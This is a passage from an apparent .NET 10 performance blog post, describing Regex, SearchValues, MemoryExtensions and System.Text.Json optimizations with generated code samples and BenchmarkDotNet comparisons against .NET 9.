rather than the <code>"*/"</code> literal, which resulted in it emitting the equivalent of <code>IndexOfAnyInRange((char)0, '\uFFFF')</code> rather than the equivalent of <code>IndexOf("*/")</code>. Oops. It was still functionally correct, in that the <code>IndexOfAnyInRange</code> call would successfully match the first character and the loop would re-evaluate from that location, but that means that rather than efficiently skipping using SIMD over a bunch of positions that couldn&rsquo;t possibly match, we were doing non-trivial work for each and every position along the way.</p><p><a href="https://github.com/dotnet/runtime/pull/118087">dotnet/runtime#118087</a> represents another interesting transformation related to alternations. It&rsquo;s very common to come across alternations with empty branches, possibly because that&rsquo;s what the developer wrote, but more commonly as an outcome of other transformations that have happened. For example, given the pattern <code>\r\n|\r</code>, which is trying to match line endings that begin with <code>\r</code>, there is an optimization that will factor out a common prefix of all of the branches, producing the equivalent of <code>\r(?:\n|)</code>; in other words, <code>\r</code> followed by either a line feed or empty. Such an alternation is a perfectly valid representation for this concept, but there&rsquo;s a more natural one: <code>?</code>. Behaviorally, this pattern is identical to <code>\r\n?</code>, and because the latter is more common and more canonical, the regex engine has more optimizations that recognize this loop-based form, for example coalescing with other loops, or auto-atomicity. As such, this PR finds all alternations of the form <code>X|</code> and transforms them into <code>X?</code>. Similarly, it finds all alternations of the form <code>|X</code> and transforms them into <code>X??</code>. The difference between <code>X|</code> and <code>|X</code> is whether <code>X</code> is tried first or empty is tried first; similarly, the difference between the greedy <code>X?</code> loop and the lazy <code>X??</code> loop is whether <code>X</code> is tried first or empty is tried first. The impact of this can be seen in the code generated for the previously cited example. Here is the source-generated code for the heart of the matching routine for <code>\r\n|\r</code> on .NET 9:</p><pre><code>// Match '\r'. if (slice.IsEmpty || slice[0] != '\r') { return false; // The input didn't match. } // Match with 2 alternative expressions, atomically. { int alternation_starting_pos = pos; // Branch 0 { // Match '\n'. if ((uint)slice.Length &lt; 2 || slice[1] != '\n') { goto AlternationBranch; } pos += 2; slice = inputSpan.Slice(pos); goto AlternationMatch; AlternationBranch: pos = alternation_starting_pos; slice = inputSpan.Slice(pos); } // Branch 1 { pos++; slice = inputSpan.Slice(pos); } AlternationMatch:; }</code></pre><p>Now, here&rsquo;s what&rsquo;s produced on .NET 10:</p><pre><code>// Match '\r'. if (slice.IsEmpty || slice[0] != '\r') { return false; // The input didn't match. } // Match '\n' atomically, optionally. if ((uint)slice.Length &gt; (uint)1 &amp;&amp; slice[1] == '\n') { slice = slice.Slice(1); pos++; }</code></pre><p>The optimizer recognized that the <code>\r\n|\r</code> was the same as <code>\r(?:\n|)</code>, which is the same as <code>\r\n?</code>, which is the same as <code>\r(?&gt;\n?)</code>, which it can produce much simplified code for, given that it no longer needs any backtracking.</p><pre><code>// dotnet run -c Release -f net9.0 --filter "*" --runtimes net9.0 net10.0 using BenchmarkDotNet.Attributes; using BenchmarkDotNet.Running; using System.Text.RegularExpressions; BenchmarkSwitcher.FromAssembly(typeof(Tests).Assembly).Run(args); [HideColumns("Job", "Error", "StdDev", "Median", "RatioSD")] public partial class Tests { private static readonly string s_input = new HttpClient().GetStringAsync(@"https://www.gutenberg.org/cache/epub/3200/pg3200.txt").Result; private static readonly Regex s_regex = new Regex(@"ab|a", RegexOptions.Compiled); [Benchmark] public int Count() =&gt; s_regex.Count(s_input); }</code></pre> <table> <thead> <tr> <th>Method</th> <th>Runtime</th> <th>Mean</th> <th>Ratio</th> </tr> </thead> <tbody> <tr> <td>Count</td> <td>.NET 9.0</td> <td>23.35 ms</td> <td>1.00</td> </tr> <tr> <td>Count</td> <td>.NET 10.0</td> <td>18.73 ms</td> <td>0.80</td> </tr> </tbody> </table><p>.NET 10 also features improvements to <code>Regex</code> that go beyond just this form of work elimination. <code>Regex</code>&lsquo;s matching routines are logically factored into two pieces: finding as quickly as possible the next place that could possibly match (<code>TryFindNextPossibleStartingPosition</code>), and then performing the full matching routine at that location (<code>TryMatchAtCurrentPosition</code>). It&rsquo;s desirable that <code>TryFindNextPossibleStartingPosition</code> both does its work as quickly as possible while also significantly limiting the number of locations a full match should be performed. <code>TryFindNextPossibleStartingPosition</code>, for example, could operate very quickly just by always saying that the next index in the input should be tested, which would result in the full matching logic being performed at every index in the input; that&rsquo;s not great for performance. Instead, the optimizer analyzes the pattern looking for things that would allow it to quickly search for viable starting locations, e.g. fixed strings or sets at known offsets in the pattern. Anchors are some of the most valuable things the optimizer can find, as they significantly inhibit the possible places matching is valid; the ideal pattern begins with a beginning anchor (<code>^</code>), which then means the only possible place matching can be successful is at index 0.</p><p>We previously discussed lookarounds, but as it turns out, until .NET 10, lookarounds weren&rsquo;t factored into what <code>TryFindNextPossibleStartingPosition</code> should look for. <a href="https://github.com/dotnet/runtime/pull/112107">dotnet/runtime#112107</a> changes that. It teaches the optimizer when and how to explore positive lookaheads at the beginning of a pattern for constructs that could help it more efficiently find starting locations. For example, in .NET 9, for the pattern <code>(?=^)hello</code>, here&rsquo;s what the source generator emits for <code>TryFindNextPossibleStartingPosition</code>:</p><pre><code>private bool TryFindNextPossibleStartingPosition(ReadOnlySpan<char> inputSpan) { int pos = base.runtextpos; // Any possible match is at least 5 characters. if (pos &lt;= inputSpan.Length - 5) { // The pattern has the literal "hello" at the beginning of the pattern. Find the next occurrence. // If it can't be found, there's no match. int i = inputSpan.Slice(pos).IndexOfAny(Utilities.s_indexOfString_hello_Ordinal); if (i &gt;= 0) { base.runtextpos = pos + i; return true; } } // No match found. base.runtextpos = inputSpan.Length; return false; }</char></code></pre><p>The optimizer found the <code>"hello"</code> string in the pattern and is thus searching for that as part of finding the next possible place to do the full match. That would be excellent, if it weren&rsquo;t for the lookahead that also says any match must happen at the beginning of the input. Now in .NET 10, we get this:</p><pre><code>private bool TryFindNextPossibleStartingPosition(ReadOnlySpan<char> inputSpan) { int pos = base.runtextpos; // Any possible match is at least 5 characters. if (pos &lt;= inputSpan.Length - 5) { // The pattern leads with a beginning (\A) anchor. if (pos == 0) { return true; } } // No match found. base.runtextpos = inputSpan.Length; return false; }</char></code></pre><p>That <code>pos == 0</code> check is critical, because it means we will only ever attempt the full match in one location and we can avoid the search that would happen even if we never found a good location to perform the match. Again, any time you eliminate work like this, you can construct tantalizing micro-benchmarks&hellip;</p><pre><code>// dotnet run -c Release -f net9.0 --filter "*" --runtimes net9.0 net10.0 using BenchmarkDotNet.Attributes; using BenchmarkDotNet.Running; using System.Text.RegularExpressions; BenchmarkSwitcher.FromAssembly(typeof(Tests).Assembly).Run(args); [HideColumns("Job", "Error", "StdDev", "Median", "RatioSD")] public partial class Tests { private static readonly string s_input = new HttpClient().GetStringAsync(@"https://www.gutenberg.org/cache/epub/3200/pg3200.txt").Result; private static readonly Regex s_regex = new Regex(@"(?=^)hello", RegexOptions.Compiled); [Benchmark] public int Count() =&gt; s_regex.Count(s_input); }</code></pre> <table> <thead> <tr> <th>Method</th> <th>Runtime</th> <th>Mean</th> <th>Ratio</th> </tr> </thead> <tbody> <tr> <td>Count</td> <td>.NET 9.0</td> <td>2,383,784.95 ns</td> <td>1.000</td> </tr> <tr> <td>Count</td> <td>.NET 10.0</td> <td>17.43 ns</td> <td>0.000</td> </tr> </tbody> </table><p>That same PR also improved optimizations over alternations. It&rsquo;s already the case that the branches of alternations are analyzed looking for common prefixes that can be factored out. For example, given the pattern <code>abc|abd</code>, the optimizer will spot the shared <code>"ab"</code> prefix at the beginning of each branch and factor that out, resulting in <code>ab(?:c|d)</code>, and will then see that each branch of the remaining alternation are individual characters, which it can convert into a set, <code>ab[cd]</code>. If, however, the branches began with anchors, these optimizations wouldn&rsquo;t be applied. Given the pattern <code>^abc|^abd</code>, the code generators would end up emitting this exactly as it&rsquo;s written, with an alternation with two branches, the first branch checking for the beginning and then matching <code>"abc"</code>, the second branch also checking for the beginning and then matching <code>"abd"</code>. Now in .NET 10, the anchor can be factored out, such that <code>^abc|^abd</code> ends up being rewritten as <code>^ab[cd]</code>.</p><p>As a small tweak, <a href="https://github.com/dotnet/runtime/pull/112065">dotnet/runtime#112065</a> also helps improve the source generated code for repeaters by using a more efficient searching routine. Let&rsquo;s take the pattern <code>[0-9a-f]{32}</code> as an example. This is looking for sequences of 32 lowercase hex digits. In .NET 9, the implementation of that ends up looking like this:</p><pre><code>// Match a character in the set [0-9a-f] exactly 32 times. { if ((uint)slice.Length &lt; 32) { return false; // The input didn't match. } if (slice.Slice(0, 32).IndexOfAnyExcept(Utilities.s_asciiHexDigitsLower) &gt;= 0) { return false; // The input didn't match. } }</code></pre><p>Simple, clean, fairly concise, and utilizing the vectorized <code>IndexOfAnyExcept</code> to very efficiently validate that the whole sequence of 32 characters are lowercase hex. We can do a tad bit better, though. The <code>IndexOfAnyExcept</code> method not only needs to find whether the span contains something other than one of the provided values, it needs to specify the index at which that found value occurs. That&rsquo;s only a few instructions, but it&rsquo;s a few unnecessary instructions, since here that exact index isn&rsquo;t utilized&hellip; the implementation only cares whether it&rsquo;s <code>&gt;= 0</code>, meaning whether anything was found or not. As such, we can instead use the <code>Contains</code> variant of this method, which doesn&rsquo;t need to spend extra cycles determining the exact index. Now in .NET 10, this is generated:</p><pre><code>// Match a character in the set [0-9a-f] exactly 32 times. if ((uint)slice.Length &lt; 32 || slice.Slice(0, 32).ContainsAnyExcept(Utilities.s_asciiHexDigitsLower)) { return false; // The input didn't match. }</code></pre><p>Finally, the .NET 10 SDK includes a new analyzer related to <code>Regex</code>. It&rsquo;s oddly common to see code that determines whether an input matches a <code>Regex</code> written like this: <code>Regex.Match(...).Success</code>. While functionally correct, that&rsquo;s much more expensive than <code>Regex.IsMatch(...)</code>. For all of the engines, <code>Regex.Match(...)</code> requires allocating a new <code>Match</code> object and supporting data structures (except when there isn&rsquo;t a match found, in which case it&rsquo;s able to use an empty singleton); in contrast, <code>IsMatch</code> doesn&rsquo;t need to allocate such an instance because it doesn&rsquo;t need to return such an instance (as an implementation detail, it may still use a <code>Match</code> object, but it can reuse one rather than creating a new one each time). It can also avoid other inefficiencies. <code>RegexOptions.NonBacktracking</code> is &ldquo;pay-for-play&rdquo; with the information it needs to gather. Determining just <em>whether</em> there&rsquo;s a match is cheaper than determining exactly where the match begins and ends, which is cheaper still than determining all of the captures that make up that match. <code>IsMatch</code> is thus the cheapest, only needing to determine that there is a match, not exactly where it is or what the exact captures are, whereas <code>Match</code> needs to determine all of that. <code>Regex.Matches(...).Count</code> is similar; it&rsquo;s having to gather all of the relevant details and allocate a whole bunch of objects, whereas <code>Regex.Count(...)</code> can do so in a much more efficient manner. <a href="https://github.com/dotnet/roslyn-analyzers/pull/7547">dotnet/roslyn-analyzers#7547</a> adds CA1874 and CA1875, which flag these cases and recommend use of <code>IsMatch</code> and <code>Count</code>, respectively.</p><p><img src="https://devblogs.microsoft.com/dotnet/wp-content/uploads/sites/10/2025/09/CA1875.png" alt="Analyzer and fixer for CA1875"></p><pre><code>// dotnet run -c Release -f net10.0 --filter ** using BenchmarkDotNet.Attributes; using BenchmarkDotNet.Running; using System.Text.RegularExpressions; BenchmarkSwitcher.FromAssembly(typeof(Tests).Assembly).Run(args); [MemoryDiagnoser(displayGenColumns: false)] [HideColumns("Job", "Error", "StdDev", "Median", "RatioSD")] public partial class Tests { private static readonly string s_input = new HttpClient().GetStringAsync(@"https://www.gutenberg.org/cache/epub/3200/pg3200.txt").Result; private static readonly Regex s_regex = new Regex(@"\b\w+\b", RegexOptions.NonBacktracking); [Benchmark(Baseline = true)] public int MatchesCount() =&gt; s_regex.Matches(s_input).Count; [Benchmark] public int Count() =&gt; s_regex.Count(s_input); }</code></pre> <table> <thead> <tr> <th>Method</th> <th>Mean</th> <th>Ratio</th> <th>Allocated</th> <th>Alloc Ratio</th> </tr> </thead> <tbody> <tr> <td>MatchesCount</td> <td>680.4 ms</td> <td>1.00</td> <td>665530176 B</td> <td>1.00</td> </tr> <tr> <td>Count</td> <td>219.0 ms</td> <td>0.32</td> <td>&ndash;</td> <td>0.00</td> </tr> </tbody> </table><p><code>Regex</code> is one form of searching, but there are other primitives and helpers throughout .NET for various forms of searching, and they&rsquo;ve seen meaningful improvements in .NET 10, as well.</p><h3>SearchValues</h3><p>When discussing performance improvements in .NET 8, I called out two changes that were my favorites. The first was dynamic PGO. The second was <a href="https://devblogs.microsoft.com/dotnet/performance-improvements-in-net-8/#searchvalues"><code>SearchValues</code></a>.</p><p><code>SearchValues</code> provides a mechanism for precomputing optimal strategies for searching. .NET 8 introduced overloads of <code>SearchValues.Create</code> that produce <code>SearchValues<byte></byte></code> and <code>SearchValues<char></char></code>, and corresponding overloads of <code>IndexOfAny</code> and friends that accept such instances. If there&rsquo;s a set of values you&rsquo;ll be searching for over and over and over, you can create one of these instances once, cache it, and then use it for all subsequent searches for those values, e.g.</p><pre><code>private static readonly SearchValues<char> s_validBase64Chars = SearchValues.Create("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"); internal static bool IsValidBase64(ReadOnlySpan<char> input) =&gt; input.ContainsAnyExcept(s_validBase64Chars);</char></char></code></pre><p>There are a plethora of different implementations used by <code>SearchValues<t></t></code> behind the scenes, each of which is selected and configured based on the <code>T</code> and the exact nature of the target values for which we&rsquo;re searching. <a href="https://github.com/dotnet/runtime/pull/106900">dotnet/runtime#106900</a> adds another, which both helps to shave off several instructions in the core vectorized search loop, and helps to highlight just how nuanced these different algorithms can be. Previously, if four target <code>byte</code> values were provided, and they weren&rsquo;t in a contiguous range, <code>SearchValues.Create</code> would choose an implementation that just uses four vectors, one per target byte, and does four comparisons (one against each target vector) for each input vector being tested. However, there&rsquo;s already a specialization that&rsquo;s used for more than five target bytes when all of the target bytes are ASCII. This PR allows that specialization to be used for both four or five targets when the lower nibble (the bottom four bits) of each of the targets is unique, and in doing so, it becomes several instructions cheaper: rather than doing four comparisons, it can do a single shuffle and equality check.</p><pre><code>// dotnet run -c Release -f net9.0 --filter "*" --runtimes net9.0 net10.0 using BenchmarkDotNet.Attributes; using BenchmarkDotNet.Running; using System.Buffers; BenchmarkSwitcher.FromAssembly(typeof(Tests).Assembly).Run(args); [HideColumns("Job", "Error", "StdDev", "Median", "RatioSD")] public partial class Tests { private static readonly byte[] s_haystack = new HttpClient().GetByteArrayAsync(@"https://www.gutenberg.org/cache/epub/3200/pg3200.txt").Result; private static readonly SearchValues<byte> s_needle = SearchValues.Create("\0\r&amp;&lt;"u8); [Benchmark] public int Count() { int count = 0; ReadOnlySpan<byte> haystack = s_haystack.AsSpan(); int pos; while ((pos = haystack.IndexOfAny(s_needle)) &gt;= 0) { count++; haystack = haystack.Slice(pos + 1); } return count; } }</byte></byte></code></pre> <table> <thead> <tr> <th>Method</th> <th>Runtime</th> <th>Mean</th> <th>Ratio</th> </tr> </thead> <tbody> <tr> <td>Count</td> <td>.NET 9.0</td> <td>3.704 ms</td> <td>1.00</td> </tr> <tr> <td>Count</td> <td>.NET 10.0</td> <td>2.668 ms</td> <td>0.72</td> </tr> </tbody> </table><p><a href="https://github.com/dotnet/runtime/pull/107798">dotnet/runtime#107798</a> improves another such algorithm, when AVX512 is available. One of the fallback strategies used by <code>SearchValues.Create<char></char></code> is a vectorized &ldquo;probabilistic map&rdquo;, basically a Bloom filter. It has a bitmap that stores a bit for each <code>byte</code> of the <code>char</code>; when testing to see whether the <code>char</code> is in the target set, it checks to see whether the bit for each of the <code>char</code>&lsquo;s <code>byte</code>s is set. If at least one isn&rsquo;t set, the <code>char</code> definitely isn&rsquo;t in the target set. If both are set, more validation will need to be done to determine the actual inclusion of that value in the set. This can make it very efficient to rule out large amounts of input that definitely are not in the set and then only spend more effort on input that might be. The implementation involves various shuffle, shift, and permute operations, and this change is able to use a better set of instructions that reduce the number needed.</p><pre><code>// dotnet run -c Release -f net9.0 --filter "*" --runtimes net9.0 net10.0 using BenchmarkDotNet.Attributes; using BenchmarkDotNet.Running; using System.Buffers; BenchmarkSwitcher.FromAssembly(typeof(Tests).Assembly).Run(args); [HideColumns("Job", "Error", "StdDev", "Median", "RatioSD")] public partial class Tests { private static readonly SearchValues<char> s_searchValues = SearchValues.Create("&szlig;&auml;&ouml;&uuml;&Auml;&Ouml;&Uuml;"); private string _input = new string('\n', 10_000); [Benchmark] public int IndexOfAny() =&gt; _input.AsSpan().IndexOfAny(s_searchValues); }</char></code></pre> <table> <thead> <tr> <th>Method</th> <th>Runtime</th> <th>Mean</th> <th>Ratio</th> </tr> </thead> <tbody> <tr> <td>IndexOfAny</td> <td>.NET 9.0</td> <td>437.7 ns</td> <td>1.00</td> </tr> <tr> <td>IndexOfAny</td> <td>.NET 10.0</td> <td>404.7 ns</td> <td>0.92</td> </tr> </tbody> </table><p>While .NET 8 introduced support for <code>SearchValues<byte></byte></code> and <code>SearchValues<char></char></code>, .NET 9 introduced support for <code>SearchValues<string></string></code>. <code>SearchValues<string></string></code> is used a bit differently from <code>SearchValues<byte></byte></code> and <code>SearchValues<char></char></code>; whereas <code>SearchValues<byte></byte></code> is used to search for target <code>byte</code>s within a collection of <code>byte</code>s and <code>SearchValues<char></char></code> is used to search for target <code>char</code>s within a collection of <code>char</code>s, <code>SearchValues<string></string></code> is used to search for target <code>string</code>s within a single <code>string</code> (or span of <code>char</code>s). In other words, it&rsquo;s a multi-substring search. Let&rsquo;s say you have the regular expression <code>(?i)hello|world</code>; that is specifying that it should look for either &ldquo;hello&rdquo; or &ldquo;world&rdquo; in a case-insensitive manner; the <code>SearchValues</code> equivalent of that is <code>SearchValues.Create(["hello", "world"], StringComparison.OrdinalIgnoreCase)</code> (in fact, if you specify that pattern, the <code>Regex</code> compiler and source generator will use such a <code>SearchValues.Create</code> call under the covers in order to optimize the search).</p><p><code>SearchValues<string></string></code> also gets better in .NET 10. A key algorithm used by <code>SearchValues<string></string></code> whenever possible and relevant is called &ldquo;Teddy,&rdquo; and enables performing a vectorized search for multiple substrings. In its core processing loop, when using AVX512, there are two instructions, a <code>PermuteVar8x64x2</code> and an <code>AlignRight</code>; <a href="https://github.com/dotnet/runtime/pull/107819">dotnet/runtime#107819</a> recognizes that those can be replaced by a single <code>PermuteVar64x8x2</code>. Similarly, when on Arm64, <a href="https://github.com/dotnet/runtime/pull/118110">dotnet/runtime#118110</a> plays the instructions game and replaces a use of <code>ExtractNarrowingSaturateUpper</code> with the slightly cheaper <code>UnzipEven</code>.</p><p><code>SearchValues<string></string></code> is also able to optimize searching for a single string, spending more time to come up with optimal search parameters than does a simpler <code>IndexOf(string, StringComparison)</code> call. Similar to the approach with the probabilistic maps employed earlier, the vectorized search can yield false positives that then need to be weeded out. In some cases by construction, however, we know that false positives aren&rsquo;t possible; <a href="https://github.com/dotnet/runtime/pull/108368">dotnet/runtime#108368</a> extends an existing optimization that was case-sensitive only to also apply in some case-insensitive uses, such that we can avoid doing the extra validation step in more cases. For the candidate verification that remains, <a href="https://github.com/dotnet/runtime/pull/108365">dotnet/runtime#108365</a> also significantly reduces overhead in a variety of cases, including adding specialized handling for needles (the things being searched for) of up to 16 characters (previously it was only up to 8), and precomputing more information to make the verification faster.</p><pre><code>// dotnet run -c Release -f net9.0 --filter "*" --runtimes net9.0 net10.0 using BenchmarkDotNet.Attributes; using BenchmarkDotNet.Running; using System.Buffers; using System.Text.RegularExpressions; BenchmarkSwitcher.FromAssembly(typeof(Tests).Assembly).Run(args); [HideColumns("Job", "Error", "StdDev", "Median", "RatioSD")] public partial class Tests { private static readonly string s_haystack = new HttpClient().GetStringAsync(@"https://www.gutenberg.org/cache/epub/3200/pg3200.txt").Result; private static readonly Regex s_the = new("the", RegexOptions.IgnoreCase | RegexOptions.Compiled); private static readonly Regex s_something = new("something", RegexOptions.IgnoreCase | RegexOptions.Compiled); [Benchmark] public int CountThe() =&gt; s_the.Count(s_haystack); [Benchmark] public int CountSomething() =&gt; s_something.Count(s_haystack); }</code></pre> <table> <thead> <tr> <th>Method</th> <th>Runtime</th> <th>Mean</th> <th>Ratio</th> </tr> </thead> <tbody> <tr> <td>CountThe</td> <td>.NET 9.0</td> <td>9.881 ms</td> <td>1.00</td> </tr> <tr> <td>CountThe</td> <td>.NET 10.0</td> <td>7.799 ms</td> <td>0.79</td> </tr> <tr> <td></td> <td></td> <td></td> <td></td> </tr> <tr> <td>CountSomething</td> <td>.NET 9.0</td> <td>2.466 ms</td> <td>1.00</td> </tr> <tr> <td>CountSomething</td> <td>.NET 10.0</td> <td>2.027 ms</td> <td>0.82</td> </tr> </tbody> </table><p><a href="https://github.com/dotnet/runtime/pull/118108">dotnet/runtime#118108</a> also adds a &ldquo;packed&rdquo; variant of the single-string implementation, meaning it&rsquo;s able to handle common cases like ASCII more efficiently by ignoring a character&rsquo;s upper zero byte in order to fit twice as much into a vector.</p><pre><code>// dotnet run -c Release -f net9.0 --filter "*" --runtimes net9.0 net10.0 using BenchmarkDotNet.Attributes; using BenchmarkDotNet.Running; using System.Buffers; using System.Text.RegularExpressions; BenchmarkSwitcher.FromAssembly(typeof(Tests).Assembly).Run(args); [HideColumns("Job", "Error", "StdDev", "Median", "RatioSD")] public partial class Tests { private static readonly string s_haystack = string.Concat(Enumerable.Repeat("Sherlock Holm_s", 8_000)); private static readonly SearchValues<string> s_needles = SearchValues.Create(["Sherlock Holmes"], StringComparison.OrdinalIgnoreCase); [Benchmark] public bool ContainsAny() =&gt; s_haystack.AsSpan().ContainsAny(s_needles); }</string></code></pre> <table> <thead> <tr> <th>Method</th> <th>Runtime</th> <th>Mean</th> <th>Ratio</th> </tr> </thead> <tbody> <tr> <td>ContainsAny</td> <td>.NET 9.0</td> <td>58.41 us</td> <td>1.00</td> </tr> <tr> <td>ContainsAny</td> <td>.NET 10.0</td> <td>16.32 us</td> <td>0.28</td> </tr> </tbody> </table> <h3>MemoryExtensions</h3><p>The searching improvements continue beyond <code>SearchValues</code>, of course. Prior to .NET 10, the <code>MemoryExtensions</code> class already had a wealth of support for searching and manipulating spans, with extension methods like <code>IndexOf</code>, <code>IndexOfAnyExceptInRange</code>, <code>ContainsAny</code>, <code>Count</code>, <code>Replace</code>, <code>SequenceCompare</code>, and more (the set was further extended as well by <a href="https://github.com/dotnet/runtime/pull/112951">dotnet/runtime#112951</a>, which added <code>CountAny</code> and <code>ReplaceAny</code>), but the vast majority of these were limited to work with <code>T</code> types constrained to be <code>IEquatable<t></t></code>. And in practice, many of the types you want to search do in fact implement <code>IEquatable<t></t></code>. However, you might be in a generic context with an unconstrained <code>T</code>, such that even if the <code>T</code> used to instatiate the generic type or method is equatable, it&rsquo;s not evident in the type system and thus the <code>MemoryExtensions</code> method couldn&rsquo;t be used. And of course there are scenarios where you want to be able to supply a different comparison routine. Both of these scenarios show up, for example, in the implementation of LINQ&rsquo;s <code>Enumerable.Contains</code>; if the source <code>IEnumerable<tsource></tsource></code> is actually something we could treat as a span, like <code>TSource[]</code> or <code>List<tsource></tsource></code>, it&rsquo;d be nice to be able to just delegate to the optimized <code>MemoryExtensions.Contains<t></t></code>, but a) <code>Enumerable.Contains</code> doesn&rsquo;t constrain its <code>TSource : IEquatable<tsource></tsource></code>, and b) <code>Enumerable.Contains</code> accepts an optional comparer.</p><p>To address this, <a href="https://github.com/dotnet/runtime/pull/110197">dotnet/runtime#110197</a> adds ~30 new overloads to the <code>MemoryExtensions</code> class. These overloads all parallel existing methods, but remove the <code>IEquatable<t></t></code> (or <code>IComparable<t></t></code>) constraint on the generic method parameter and accept an optional <code>IEqualityComparer<t>?</t></code> (or <code>IComparer<t></t></code>). When no comparer or a default comparer is supplied, they can fall back to using the same vectorized logic for relevant types, and otherwise can provide as optimal an implementation as they can muster, based on the nature of <code>T</code> and the supplied comparer.</p><pre><code>// dotnet run -c Release -f net9.0 --filter "*" --runtimes net9.0 net10.0 using BenchmarkDotNet.Attributes; using BenchmarkDotNet.Running; BenchmarkSwitcher.FromAssembly(typeof(Tests).Assembly).Run(args); [HideColumns("Job", "Error", "StdDev", "Median", "RatioSD")] public partial class Tests { private IEnumerable<int> _data = Enumerable.Range(0, 1_000_000).ToArray(); [Benchmark] public bool Contains() =&gt; _data.Contains(int.MaxValue, EqualityComparer<int>.Default); }</int></int></code></pre> <table> <thead> <tr> <th>Method</th> <th>Runtime</th> <th>Mean</th> <th>Ratio</th> </tr> </thead> <tbody> <tr> <td>Contains</td> <td>.NET 9.0</td> <td>213.94 us</td> <td>1.00</td> </tr> <tr> <td>Contains</td> <td>.NET 10.0</td> <td>67.86 us</td> <td>0.32</td> </tr> </tbody> </table><p>(It&rsquo;s also worth highlighting that with the &ldquo;first-class&rdquo; span support in C# 14, many of these extensions from <code>MemoryExtensions</code> now naturally show up directly on types like <code>string</code>.)</p><p>This kind of searching often shows up as part of other APIs. For example, encoding APIs often need to first find something to be encoded, and that searching can be accelerated by using one of these efficiently implemented search APIs. There are dozens and dozens of existing examples of that throughout the core libraries, many of the places using <code>SearchValues</code> or these various <code>MemoryExtensions</code> methods. <a href="https://github.com/dotnet/runtime/pull/110574">dotnet/runtime#110574</a> adds another, speeding up <code>string.Normalize</code>&lsquo;s argument validation. The current implementation walks character by character looking for the first surrogate. The new implementation gives that a jump start by using <code>IndexOfAnyInRange</code>.</p><pre><code>// dotnet run -c Release -f net9.0 --filter "*" --runtimes net9.0 net10.0 using BenchmarkDotNet.Attributes; using BenchmarkDotNet.Running; BenchmarkSwitcher.FromAssembly(typeof(Tests).Assembly).Run(args); [HideColumns("Job", "Error", "StdDev", "Median", "RatioSD")] public partial class Tests { private string _input = "This is a test. This is only a test. Nothing to see here. \u263A\uFE0F"; [Benchmark] public string Normalize() =&gt; _input.Normalize(); }</code></pre> <table> <thead> <tr> <th>Method</th> <th>Runtime</th> <th>Mean</th> <th>Ratio</th> </tr> </thead> <tbody> <tr> <td>Normalize</td> <td>.NET 9.0</td> <td>104.93 ns</td> <td>1.00</td> </tr> <tr> <td>Normalize</td> <td>.NET 10.0</td> <td>88.94 ns</td> <td>0.85</td> </tr> </tbody> </table><p><a href="https://github.com/dotnet/runtime/pull/110478">dotnet/runtime#110478</a> similarly updates <code>HttpUtility.UrlDecode</code> to use the vectorized <code>IndexOfAnyInRange</code>. It also avoids allocating the resulting <code>string</code> if nothing needs to be decoded.</p><pre><code>// dotnet run -c Release -f net9.0 --filter "*" --runtimes net9.0 net10.0 using BenchmarkDotNet.Attributes; using BenchmarkDotNet.Running; using System.Web; BenchmarkSwitcher.FromAssembly(typeof(Tests).Assembly).Run(args); [HideColumns("Job", "Error", "StdDev", "Median", "RatioSD")] public partial class Tests { [Benchmark] public string UrlDecode() =&gt; HttpUtility.UrlDecode("aaaaabbbbb%e2%98%ba%ef%b8%8f"); }</code></pre> <table> <thead> <tr> <th>Method</th> <th>Runtime</th> <th>Mean</th> <th>Ratio</th> </tr> </thead> <tbody> <tr> <td>UrlDecode</td> <td>.NET 9.0</td> <td>59.42 ns</td> <td>1.00</td> </tr> <tr> <td>UrlDecode</td> <td>.NET 10.0</td> <td>54.26 ns</td> <td>0.91</td> </tr> </tbody> </table><p>Similarly, <a href="https://github.com/dotnet/runtime/pull/114494">dotnet/runtime#114494</a> employs <code>SearchValues</code> in <code>OptimizedInboxTextEncoder</code>, which is the core implementation that backs the various encoders like <code>JavaScriptEncoder</code> and <code>HtmlEncoder</code> in the <code>System.Text.Encodings.Web</code> library.</p><h2>JSON</h2><p>JSON is at the heart of many different domains, having become the lingua franca of data interchange on the web. With <code>System.Text.Json</code> as the recommended library for working with JSON in .NET, it is constantly evolving to meet additional performance requirements. .NET 10 sees it updated with both improvements to the performance of existing methods as well as new methods specifically geared towards helping with performance.</p><p>The <code>JsonSerializer</code> type is layered on top of the lower-level <code>Utf8JsonReader</code> and <code>Utf8JsonWriter</code> types. When serializing, <code>JsonSerializer</code> needs an instance of <code>Utf8JsonWriter</code>, which is a <code>class</code>, and any associated objects, such as an <code>IBufferWriter</code> instance. For any temporary buffers it requires, it&rsquo;ll use rented buffers from <code>ArrayPool<byte></byte></code>, but for these helper objects, it maintains its own cache, to avoid needing to recreate them at very high frequencies. That cache was being used for all asynchronous streaming serialization operations, but as it turns out, it wasn&rsquo;t being used for synchronous streaming serialization operations. <a href="https://github.com/dotnet/runtime/pull/112745">dotnet/runtime#112745</a> fixes that to make the use of the cache consistent, avoiding these intermediate allocations.</p><pre><code>// dotnet run -c Release -f net9.0 --filter "*" --runtimes net9.0 net10.0 using BenchmarkDotNet.Attributes; using BenchmarkDotNet.Running; using System.Text.Json; BenchmarkSwitcher.FromAssembly(typeof(Tests).Assembly).Run(args); [MemoryDiagnoser(displayGenColumns: false)] [HideColumns("Job", "Error", "StdDev", "Median", "RatioSD")] public partial class Tests { private Data _data = new(); private MemoryStream _stream = new(); [Benchmark] public void Serialize() { _stream.Position = 0; JsonSerializer.Serialize(_stream, _data); } public class Data { public int Value1 { get; set; } } }</code></pre> <table> <thead> <tr> <th>Method</th> <th>Runtime</th> <th>Mean</th> <th>Ratio</th> <th>Allocated</th> <th>Alloc Ratio</th> </tr> </thead> <tbody> <tr> <td>Serialize</td> <td>.NET 9.0</td> <td>115.36 ns</td> <td>1.00</td> <td>176 B</td> <td>1.00</td> </tr> <tr> <td>Serialize</td> <td>.NET 10.0</td> <td>77.73 ns</td> <td>0.67</td> <td>&ndash;</td> <td>0.00</td> </tr> </tbody> </table><p>Earlier when discussing collections, it was noted that <code>OrderedDictionary<tkey></tkey></code> now exposes overloads of methods like <code>TryAdd</code> that return the relevant item&rsquo;s index, which then allows subsequent access to avoid the more costly key-based lookup. As it turns out, <code>JsonObject</code>&lsquo;s indexer needs to do that, first indexing into the dictionary by key, doing some checks, and then indexing again. It&rsquo;s now been updated to use these new overloads. As those lookups typically dominate the cost of using the setter, this can upwards of double throughput of <code>JsonObject</code>&lsquo;s indexer:</p><pre><code>// dotnet run -c Release -f net9.0 --filter "*" --runtimes net9.0 net10.0 using BenchmarkDotNet.Attributes; 